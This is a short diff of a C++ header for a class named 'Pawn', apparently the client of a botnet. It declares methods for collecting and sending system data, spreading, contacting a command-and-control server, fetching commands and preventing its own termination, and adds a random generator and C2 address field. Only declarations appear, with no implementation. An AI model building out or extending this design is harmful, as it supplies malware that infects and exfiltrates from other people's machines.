@@ -8,22 +8,27 @@
 #include "CollectSystemData.h"
 #include "NetworkOperations.h"
 #include "Helper.h"
+#include "PRNG.h"
 
 
 class Pawn {
 
 public:
-    SystemDataCollector systemData;
+    SystemDataCollector sdc;
+    PRNG gen;
+    std::string CC;
 
     Pawn();
     ~Pawn();
 
     bool sendMySelfData();
     bool spread();
-    void doWork();
     bool checkSWKill();
-    bool connect2CC();
     bool sendData2IP();
+    std::string getCC();
+    std::string getCommand();
+    void doWork();
+    void connect2CC();
     void preventKill();
 };
 
